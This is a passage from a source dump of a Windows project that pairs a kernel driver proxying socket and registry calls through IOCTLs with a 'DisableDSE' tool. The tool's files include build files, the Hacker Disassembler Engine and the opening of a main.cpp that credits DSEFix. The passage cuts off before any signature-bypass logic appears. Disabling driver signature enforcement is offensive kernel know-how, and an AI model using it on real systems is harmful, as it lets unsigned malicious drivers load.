		Status = APIProxyRegistryQueryValue(QueryKeyValueInfo);

	}
	break;

	case IOCTL_API_PROXY_WSAStartup:
	{
		auto WSAStartInfo = (WSAStartCleanUp*)UserData;
		if (DataSize < sizeof(WSAStartCleanUp)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyWSAStartup(WSAStartInfo);

	}
	break;

	case IOCTL_API_PROXY_WSACleanup:
	{
		auto WSASCleanUpInfo = (WSAStartCleanUp*)UserData;
		if (DataSize < sizeof(WSAStartCleanUp)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyWSACleanup(WSASCleanUpInfo);

	}
	break;

	case IOCTL_API_PROXY_Socket:
	{
		auto SocketInfo = (SocketStruct*)UserData;
		if (DataSize < sizeof(SocketStruct)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxySocket(&(SocketInfo->WSAStartCleanUpptr), (PKSOCKET*)&(SocketInfo->Socket), 
			SocketInfo->Domain, SocketInfo->Type, SocketInfo->Protocol, SocketInfo->Flags);

	}
	break;

	case IOCTL_API_PROXY_CloseSocket:
	{
		auto SocketPtr = (PVOID*)UserData;
		if (DataSize < sizeof(PVOID)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyCloseSocket((PKSOCKET)*SocketPtr);

	}
	break;

	case IOCTL_API_PROXY_Connect:
	{
		auto ConnectInfo = (ConnectStruct*)UserData;
		if (DataSize < sizeof(ConnectStruct)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyConnect(ConnectInfo);
		DbgPrint("Status %x\n", Status);
	}
	break;

	case IOCTL_API_PROXY_Send:
	{
		auto SendInfo = (SendRecvStruct*)UserData;
		if (DataSize < sizeof(SendRecvStruct)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxySend(SendInfo);

	}
	break;

	case IOCTL_API_PROXY_Recv:
	{
		auto RecvInfo = (SendRecvStruct*)UserData;
		if (DataSize < sizeof(SendRecvStruct)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyRecv(RecvInfo);

	}
	break;


	case IOCTL_API_PROXY_Bind:
	{
		auto BindInfo = (BindStruct*)UserData;
		if (DataSize < sizeof(BindStruct)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyBind(BindInfo);

	}
	break;

	case IOCTL_API_PROXY_Accept:
	{
		auto AcceptInfo = (AcceptStruct*)UserData;
		if (DataSize < sizeof(AcceptStruct)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyAccept(AcceptInfo);

	}
	break;

	case IOCTL_API_PROXY_listen:
	{
		APIProxyListen();

	}
	break;

	case IOCTL_API_PROXY_GetAddrInfo:
	{
		auto AddrInfo = (GetAddrInfoStruct*)UserData;
		if (DataSize < sizeof(GetAddrInfoStruct)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}


		Status = APIProxtGetAddrInfo(AddrInfo);

	}
	break;

	case IOCTL_API_PROXY_FreeAddrInfo:
	{
		auto AddrInfo = (struct addrinfo*)UserData;
		if (DataSize < sizeof(struct addrinfo*)) {
			Status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		Status = APIProxyFreeAddrInfo(AddrInfo);

	}
	break;

	default:
		Status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

Finish:

	Irp->IoStatus.Status = Status;
	Irp->IoStatus.Information = DataWritten;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Status;
}


```

`APICallProxy/DisableDSE/DisableDSE.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{e9415243-3a91-4da8-a331-ca475db3b845}</ProjectGuid>
    <RootNamespace>DisableDSE</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="hde64.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`APICallProxy/DisableDSE/DisableDSE.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="hde64.h">
      <Filter>Source Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`APICallProxy/DisableDSE/hde64.h`:

```h
/*
 * Hacker Disassembler Engine 64 C
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 */


#pragma warning(push)
#pragma warning(disable:4701)
#pragma warning(disable:4706)

 /*
  * Hacker Disassembler Engine 64
  * Copyright (c) 2008-2009, Vyacheslav Patkov.
  * All rights reserved.
  *
  * hde64.h: C/C++ header file
  *
  */

#ifndef _HDE64_H_
#define _HDE64_H_

  /* stdint.h - C99 standard header
   * http://en.wikipedia.org/wiki/stdint.h
   *
   * if your compiler doesn't contain "stdint.h" header (for
   * example, Microsoft Visual C++), you can download file:
   *   http://www.azillionmonkeys.com/qed/pstdint.h
   * and change next line to:
   *   #include "pstdint.h"
   */

#include <windows.h>

   // Integer types for HDE.
typedef INT8   int8_t;
typedef INT16  int16_t;
typedef INT32  int32_t;
typedef INT64  int64_t;
typedef UINT8  uint8_t;
typedef UINT16 uint16_t;
typedef UINT32 uint32_t;
typedef UINT64 uint64_t;

#define F_MODRM         0x00000001
#define F_SIB           0x00000002
#define F_IMM8          0x00000004
#define F_IMM16         0x00000008
#define F_IMM32         0x00000010
#define F_IMM64         0x00000020
#define F_DISP8         0x00000040
#define F_DISP16        0x00000080
#define F_DISP32        0x00000100
#define F_RELATIVE      0x00000200
#define F_ERROR         0x00001000
#define F_ERROR_OPCODE  0x00002000
#define F_ERROR_LENGTH  0x00004000
#define F_ERROR_LOCK    0x00008000
#define F_ERROR_OPERAND 0x00010000
#define F_PREFIX_REPNZ  0x01000000
#define F_PREFIX_REPX   0x02000000
#define F_PREFIX_REP    0x03000000
#define F_PREFIX_66     0x04000000
#define F_PREFIX_67     0x08000000
#define F_PREFIX_LOCK   0x10000000
#define F_PREFIX_SEG    0x20000000
#define F_PREFIX_REX    0x40000000
#define F_PREFIX_ANY    0x7f000000

#define PREFIX_SEGMENT_CS   0x2e
#define PREFIX_SEGMENT_SS   0x36
#define PREFIX_SEGMENT_DS   0x3e
#define PREFIX_SEGMENT_ES   0x26
#define PREFIX_SEGMENT_FS   0x64
#define PREFIX_SEGMENT_GS   0x65
#define PREFIX_LOCK         0xf0
#define PREFIX_REPNZ        0xf2
#define PREFIX_REPX         0xf3
#define PREFIX_OPERAND_SIZE 0x66
#define PREFIX_ADDRESS_SIZE 0x67

#pragma pack(push,1)

typedef struct {
    uint8_t len;
    uint8_t p_rep;
    uint8_t p_lock;
    uint8_t p_seg;
    uint8_t p_66;
    uint8_t p_67;
    uint8_t rex;
    uint8_t rex_w;
    uint8_t rex_r;
    uint8_t rex_x;
    uint8_t rex_b;
    uint8_t opcode;
    uint8_t opcode2;
    uint8_t modrm;
    uint8_t modrm_mod;
    uint8_t modrm_reg;
    uint8_t modrm_rm;
    uint8_t sib;
    uint8_t sib_scale;
    uint8_t sib_index;
    uint8_t sib_base;
    union {
        uint8_t imm8;
        uint16_t imm16;
        uint32_t imm32;
        uint64_t imm64;
    } imm;
    union {
        uint8_t disp8;
        uint16_t disp16;
        uint32_t disp32;
    } disp;
    uint32_t flags;
} hde64s;

#pragma pack(pop)

/*
 * Hacker Disassembler Engine 64 C
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 */

#define C_NONE    0x00
#define C_MODRM   0x01
#define C_IMM8    0x02
#define C_IMM16   0x04
#define C_IMM_P66 0x10
#define C_REL8    0x20
#define C_REL32   0x40
#define C_GROUP   0x80
#define C_ERROR   0xff

#define PRE_ANY  0x00
#define PRE_NONE 0x01
#define PRE_F2   0x02
#define PRE_F3   0x04
#define PRE_66   0x08
#define PRE_67   0x10
#define PRE_LOCK 0x20
#define PRE_SEG  0x40
#define PRE_ALL  0xff

#define DELTA_OPCODES      0x4a
#define DELTA_FPU_REG      0xfd
#define DELTA_FPU_MODRM    0x104
#define DELTA_PREFIXES     0x13c
#define DELTA_OP_LOCK_OK   0x1ae
#define DELTA_OP2_LOCK_OK  0x1c6
#define DELTA_OP_ONLY_MEM  0x1d8
#define DELTA_OP2_ONLY_MEM 0x1e7

unsigned char hde64_table[] = {
  0xa5,0xaa,0xa5,0xb8,0xa5,0xaa,0xa5,0xaa,0xa5,0xb8,0xa5,0xb8,0xa5,0xb8,0xa5,
  0xb8,0xc0,0xc0,0xc0,0xc0,0xc0,0xc0,0xc0,0xc0,0xac,0xc0,0xcc,0xc0,0xa1,0xa1,
  0xa1,0xa1,0xb1,0xa5,0xa5,0xa6,0xc0,0xc0,0xd7,0xda,0xe0,0xc0,0xe4,0xc0,0xea,
  0xea,0xe0,0xe0,0x98,0xc8,0xee,0xf1,0xa5,0xd3,0xa5,0xa5,0xa1,0xea,0x9e,0xc0,
  0xc0,0xc2,0xc0,0xe6,0x03,0x7f,0x11,0x7f,0x01,0x7f,0x01,0x3f,0x01,0x01,0xab,
  0x8b,0x90,0x64,0x5b,0x5b,0x5b,0x5b,0x5b,0x92,0x5b,0x5b,0x76,0x90,0x92,0x92,
  0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x6a,0x73,0x90,
  0x5b,0x52,0x52,0x52,0x52,0x5b,0x5b,0x5b,0x5b,0x77,0x7c,0x77,0x85,0x5b,0x5b,
  0x70,0x5b,0x7a,0xaf,0x76,0x76,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,
  0x5b,0x5b,0x86,0x01,0x03,0x01,0x04,0x03,0xd5,0x03,0xd5,0x03,0xcc,0x01,0xbc,
  0x03,0xf0,0x03,0x03,0x04,0x00,0x50,0x50,0x50,0x50,0xff,0x20,0x20,0x20,0x20,
  0x01,0x01,0x01,0x01,0xc4,0x02,0x10,0xff,0xff,0xff,0x01,0x00,0x03,0x11,0xff,
  0x03,0xc4,0xc6,0xc8,0x02,0x10,0x00,0xff,0xcc,0x01,0x01,0x01,0x00,0x00,0x00,
  0x00,0x01,0x01,0x03,0x01,0xff,0xff,0xc0,0xc2,0x10,0x11,0x02,0x03,0x01,0x01,
  0x01,0xff,0xff,0xff,0x00,0x00,0x00,0xff,0x00,0x00,0xff,0xff,0xff,0xff,0x10,
  0x10,0x10,0x10,0x02,0x10,0x00,0x00,0xc6,0xc8,0x02,0x02,0x02,0x02,0x06,0x00,
  0x04,0x00,0x02,0xff,0x00,0xc0,0xc2,0x01,0x01,0x03,0x03,0x03,0xca,0x40,0x00,
  0x0a,0x00,0x04,0x00,0x00,0x00,0x00,0x7f,0x00,0x33,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0xff,0xbf,0xff,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0xff,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,
  0x00,0x00,0x00,0xbf,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x7f,0x00,0x00,
  0xff,0x40,0x40,0x40,0x40,0x41,0x49,0x40,0x40,0x40,0x40,0x4c,0x42,0x40,0x40,
  0x40,0x40,0x40,0x40,0x40,0x40,0x4f,0x44,0x53,0x40,0x40,0x40,0x44,0x57,0x43,
  0x5c,0x40,0x60,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,
  0x40,0x40,0x64,0x66,0x6e,0x6b,0x40,0x40,0x6a,0x46,0x40,0x40,0x44,0x46,0x40,
  0x40,0x5b,0x44,0x40,0x40,0x00,0x00,0x00,0x00,0x06,0x06,0x06,0x06,0x01,0x06,
  0x06,0x02,0x06,0x06,0x00,0x06,0x00,0x0a,0x0a,0x00,0x00,0x00,0x02,0x07,0x07,
  0x06,0x02,0x0d,0x06,0x06,0x06,0x0e,0x05,0x05,0x02,0x02,0x00,0x00,0x04,0x04,
  0x04,0x04,0x05,0x06,0x06,0x06,0x00,0x00,0x00,0x0e,0x00,0x00,0x08,0x00,0x10,
  0x00,0x18,0x00,0x20,0x00,0x28,0x00,0x30,0x00,0x80,0x01,0x82,0x01,0x86,0x00,
  0xf6,0xcf,0xfe,0x3f,0xab,0x00,0xb0,0x00,0xb1,0x00,0xb3,0x00,0xba,0xf8,0xbb,
  0x00,0xc0,0x00,0xc1,0x00,0xc7,0xbf,0x62,0xff,0x00,0x8d,0xff,0x00,0xc4,0xff,
  0x00,0xc5,0xff,0x00,0xff,0xff,0xeb,0x01,0xff,0x0e,0x12,0x08,0x00,0x13,0x09,
  0x00,0x16,0x08,0x00,0x17,0x09,0x00,0x2b,0x09,0x00,0xae,0xff,0x07,0xb2,0xff,
  0x00,0xb4,0xff,0x00,0xb5,0xff,0x00,0xc3,0x01,0x00,0xc7,0xff,0xbf,0xe7,0x08,
  0x00,0xf0,0x02,0x00
};


#ifdef __cplusplus
extern "C" {
#endif

    /* __cdecl */
    unsigned int hde64_disasm(const void* code, hde64s* hs);

#ifdef __cplusplus
}
#endif

#endif /* _HDE64_H_ */


unsigned int hde64_disasm(const void* code, hde64s* hs)
{
    uint8_t x, c = 0, * p = (uint8_t*)code, cflags, opcode, pref = 0;
    uint8_t* ht = hde64_table, m_mod, m_reg, m_rm, disp_size = 0;
    uint8_t op64 = 0;

    // Avoid using memset to reduce the footprint.
#ifndef _MSC_VER
    memset((LPBYTE)hs, 0, sizeof(hde64s));
#else
    __stosb((LPBYTE)hs, 0, sizeof(hde64s));
#endif

    for (x = 16; x; x--)
        switch (c = *p++) {
        case 0xf3:
            hs->p_rep = c;
            pref |= PRE_F3;
            break;
        case 0xf2:
            hs->p_rep = c;
            pref |= PRE_F2;
            break;
        case 0xf0:
            hs->p_lock = c;
            pref |= PRE_LOCK;
            break;
        case 0x26: case 0x2e: case 0x36:
        case 0x3e: case 0x64: case 0x65:
            hs->p_seg = c;
            pref |= PRE_SEG;
            break;
        case 0x66:
            hs->p_66 = c;
            pref |= PRE_66;
            break;
        case 0x67:
            hs->p_67 = c;
            pref |= PRE_67;
            break;
        default:
            goto pref_done;
        }
pref_done:

    hs->flags = (uint32_t)pref << 23;

    if (!pref)
        pref |= PRE_NONE;

    if ((c & 0xf0) == 0x40) {
        hs->flags |= F_PREFIX_REX;
        if ((hs->rex_w = (c & 0xf) >> 3) && (*p & 0xf8) == 0xb8)
            op64++;
        hs->rex_r = (c & 7) >> 2;
        hs->rex_x = (c & 3) >> 1;
        hs->rex_b = c & 1;
        if (((c = *p++) & 0xf0) == 0x40) {
            opcode = c;
            goto error_opcode;
        }
    }

    if ((hs->opcode = c) == 0x0f) {
        hs->opcode2 = c = *p++;
        ht += DELTA_OPCODES;
    }
    else if (c >= 0xa0 && c <= 0xa3) {
        op64++;
        if (pref & PRE_67)
            pref |= PRE_66;
        else
            pref &= ~PRE_66;
    }

    opcode = c;
    cflags = ht[ht[opcode / 4] + (opcode % 4)];

    if (cflags == C_ERROR) {
    error_opcode:
        hs->flags |= F_ERROR | F_ERROR_OPCODE;
        cflags = 0;
        if ((opcode & -3) == 0x24)
            cflags++;
    }

    x = 0;
    if (cflags & C_GROUP) {
        uint16_t t;
        t = *(uint16_t*)(ht + (cflags & 0x7f));
        cflags = (uint8_t)t;
        x = (uint8_t)(t >> 8);
    }

    if (hs->opcode2) {
        ht = hde64_table + DELTA_PREFIXES;
        if (ht[ht[opcode / 4] + (opcode % 4)] & pref)
            hs->flags |= F_ERROR | F_ERROR_OPCODE;
    }

    if (cflags & C_MODRM) {
        hs->flags |= F_MODRM;
        hs->modrm = c = *p++;
        hs->modrm_mod = m_mod = c >> 6;
        hs->modrm_rm = m_rm = c & 7;
        hs->modrm_reg = m_reg = (c & 0x3f) >> 3;

        if (x && ((x << m_reg) & 0x80))
            hs->flags |= F_ERROR | F_ERROR_OPCODE;

        if (!hs->opcode2 && opcode >= 0xd9 && opcode <= 0xdf) {
            uint8_t t = opcode - 0xd9;
            if (m_mod == 3) {
                ht = hde64_table + DELTA_FPU_MODRM + t * 8;
                t = ht[m_reg] << m_rm;
            }
            else {
                ht = hde64_table + DELTA_FPU_REG;
                t = ht[t] << m_reg;
            }
            if (t & 0x80)
                hs->flags |= F_ERROR | F_ERROR_OPCODE;
        }

        if (pref & PRE_LOCK) {
            if (m_mod == 3) {
                hs->flags |= F_ERROR | F_ERROR_LOCK;
            }
            else {
                uint8_t* table_end, op = opcode;
                if (hs->opcode2) {
                    ht = hde64_table + DELTA_OP2_LOCK_OK;
                    table_end = ht + DELTA_OP_ONLY_MEM - DELTA_OP2_LOCK_OK;
                }
                else {
                    ht = hde64_table + DELTA_OP_LOCK_OK;
                    table_end = ht + DELTA_OP2_LOCK_OK - DELTA_OP_LOCK_OK;
                    op &= -2;
                }
                for (; ht != table_end; ht++)
                    if (*ht++ == op) {
                        if (!((*ht << m_reg) & 0x80))
                            goto no_lock_error;
                        else
                            break;
                    }
                hs->flags |= F_ERROR | F_ERROR_LOCK;
            no_lock_error:
                ;
            }
        }

        if (hs->opcode2) {
            switch (opcode) {
            case 0x20: case 0x22:
                m_mod = 3;
                if (m_reg > 4 || m_reg == 1)
                    goto error_operand;
                else
                    goto no_error_operand;
            case 0x21: case 0x23:
                m_mod = 3;
                if (m_reg == 4 || m_reg == 5)
                    goto error_operand;
                else
                    goto no_error_operand;
            }
        }
        else {
            switch (opcode) {
            case 0x8c:
                if (m_reg > 5)
                    goto error_operand;
                else
                    goto no_error_operand;
            case 0x8e:
                if (m_reg == 1 || m_reg > 5)
                    goto error_operand;
                else
                    goto no_error_operand;
            }
        }

        if (m_mod == 3) {
            uint8_t* table_end;
            if (hs->opcode2) {
                ht = hde64_table + DELTA_OP2_ONLY_MEM;
                table_end = ht + sizeof(hde64_table) - DELTA_OP2_ONLY_MEM;
            }
            else {
                ht = hde64_table + DELTA_OP_ONLY_MEM;
                table_end = ht + DELTA_OP2_ONLY_MEM - DELTA_OP_ONLY_MEM;
            }
            for (; ht != table_end; ht += 2)
                if (*ht++ == opcode) {
                    if (*ht++ & pref && !((*ht << m_reg) & 0x80))
                        goto error_operand;
                    else
                        break;
                }
            goto no_error_operand;
        }
        else if (hs->opcode2) {
            switch (opcode) {
            case 0x50: case 0xd7: case 0xf7:
                if (pref & (PRE_NONE | PRE_66))
                    goto error_operand;
                break;
            case 0xd6:
                if (pref & (PRE_F2 | PRE_F3))
                    goto error_operand;
                break;
            case 0xc5:
                goto error_operand;
            }
            goto no_error_operand;
        }
        else
            goto no_error_operand;

    error_operand:
        hs->flags |= F_ERROR | F_ERROR_OPERAND;
    no_error_operand:

        c = *p++;
        if (m_reg <= 1) {
            if (opcode == 0xf6)
                cflags |= C_IMM8;
            else if (opcode == 0xf7)
                cflags |= C_IMM_P66;
        }

        switch (m_mod) {
        case 0:
            if (pref & PRE_67) {
                if (m_rm == 6)
                    disp_size = 2;
            }
            else
                if (m_rm == 5)
                    disp_size = 4;
            break;
        case 1:
            disp_size = 1;
            break;
        case 2:
            disp_size = 2;
            if (!(pref & PRE_67))
                disp_size <<= 1;
        }

        if (m_mod != 3 && m_rm == 4) {
            hs->flags |= F_SIB;
            p++;
            hs->sib = c;
            hs->sib_scale = c >> 6;
            hs->sib_index = (c & 0x3f) >> 3;
            if ((hs->sib_base = c & 7) == 5 && !(m_mod & 1))
                disp_size = 4;
        }

        p--;
        switch (disp_size) {
        case 1:
            hs->flags |= F_DISP8;
            hs->disp.disp8 = *p;
            break;
        case 2:
            hs->flags |= F_DISP16;
            hs->disp.disp16 = *(uint16_t*)p;
            break;
        case 4:
            hs->flags |= F_DISP32;
            hs->disp.disp32 = *(uint32_t*)p;
        }
        p += disp_size;
    }
    else if (pref & PRE_LOCK)
        hs->flags |= F_ERROR | F_ERROR_LOCK;

    if (cflags & C_IMM_P66) {
        if (cflags & C_REL32) {
            if (pref & PRE_66) {
                hs->flags |= F_IMM16 | F_RELATIVE;
                hs->imm.imm16 = *(uint16_t*)p;
                p += 2;
                goto disasm_done;
            }
            goto rel32_ok;
        }
        if (op64) {
            hs->flags |= F_IMM64;
            hs->imm.imm64 = *(uint64_t*)p;
            p += 8;
        }
        else if (!(pref & PRE_66)) {
            hs->flags |= F_IMM32;
            hs->imm.imm32 = *(uint32_t*)p;
            p += 4;
        }
        else
            goto imm16_ok;
    }


    if (cflags & C_IMM16) {
    imm16_ok:
        hs->flags |= F_IMM16;
        hs->imm.imm16 = *(uint16_t*)p;
        p += 2;
    }
    if (cflags & C_IMM8) {
        hs->flags |= F_IMM8;
        hs->imm.imm8 = *p++;
    }

    if (cflags & C_REL32) {
    rel32_ok:
        hs->flags |= F_IMM32 | F_RELATIVE;
        hs->imm.imm32 = *(uint32_t*)p;
        p += 4;
    }
    else if (cflags & C_REL8) {
        hs->flags |= F_IMM8 | F_RELATIVE;
        hs->imm.imm8 = *p++;
    }

disasm_done:

    if ((hs->len = (uint8_t)(p - (uint8_t*)code)) > 15) {
        hs->flags |= F_ERROR | F_ERROR_LENGTH;
        hs->len = 15;
    }

    return (unsigned int)hs->len;
}
#pragma warning(pop)

```

`APICallProxy/DisableDSE/main.cpp`:

```cpp
// Refrense: https://github.com/hfiref0x/DSEFix
//

#include <iostream>
#include <Windows.h>

#include "../APICallProxy/IOCTLCodes.h"
#include "../APICallProxy/CommonStruct.h"
#include "hde64.h"

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
